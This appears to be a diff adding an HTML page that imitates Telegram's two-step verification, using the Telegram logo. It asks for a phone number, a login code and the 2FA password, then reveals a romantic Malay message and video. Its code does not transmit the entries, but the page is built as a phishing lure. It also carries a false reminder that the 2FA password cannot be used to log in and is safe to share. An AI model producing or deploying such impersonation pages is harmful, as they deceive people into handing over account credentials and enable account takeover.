@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Two-Step Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #121212;
+            color: #ffffff;
+        }
+        .container {
+            text-align: center;
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            width: 300px;
+        }
+        input {
+            padding: 10px;
+            margin: 10px;
+            border: 1px solid #555;
+            border-radius: 5px;
+            width: 80%;
+            background-color: #333;
+            color: #fff;
+        }
+        button {
+            background-color: #555;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #777;
+        }
+        #step2, #step3, #videoContainer {
+            display: none;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .reminder {
+            font-size: 12px;
+            color: #ff0000;
+            margin-top: 10px;
+        }
+        #videoContainer {
+            text-align: center;
+            margin-top: 20px;
+            background: rgba(255, 105, 180, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(255, 105, 180, 0.5);
+        }
+        video {
+            width: 600px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
+        }
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+    <div class="container" id="step1">
+        <h1>Enter Your Phone Number</h1>
+        <input type="text" id="phoneInput" placeholder="Enter phone number">
+        <button onclick="sendCode()">Send Code</button>
+    </div>
+    
+    <div class="container" id="step2">
+        <h1>Enter Verification Code</h1>
+        <input type="text" id="codeInput" placeholder="Enter code">
+        <button onclick="verifyCode()">Verify</button>
+    </div>
+    
+    <div class="container" id="step3">
+        <h1>Enter Two-Step Verification Password</h1>
+        <input type="password" id="passwordInput" placeholder="Enter password">
+        <button onclick="verifyPassword()">Verify</button>
+        <p class="reminder">Please not that this cannot be use to log in telegram and safe to share with other partner.</p>
+    </div>
+    
+    <div id="videoContainer">
+        <h1>❤️ Hi sayang semoga dapat ubati rindu akan datang.Love You ❤️</h1>
+        <video controls>
+            <source src="IMG_8929.MOV" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+    
+    <script>
+        function sendCode() {
+            let phone = document.getElementById("phoneInput").value;
+            if (phone) {
+                document.getElementById("step1").style.display = "none";
+                document.getElementById("step2").style.display = "block";
+            } else {
+                alert("Please enter a valid phone number!");
+            }
+        }
+        
+        function verifyCode() {
+            document.getElementById("step2").style.display = "none";
+            document.getElementById("step3").style.display = "block";
+        }
+        
+        function verifyPassword() {
+            alert("You will receive log in info at your Telegram if succeeded");
+            document.getElementById("step3").style.display = "none";
+            document.getElementById("videoContainer").style.display = "block";
+        }
+    </script>
+</body>
+</html>
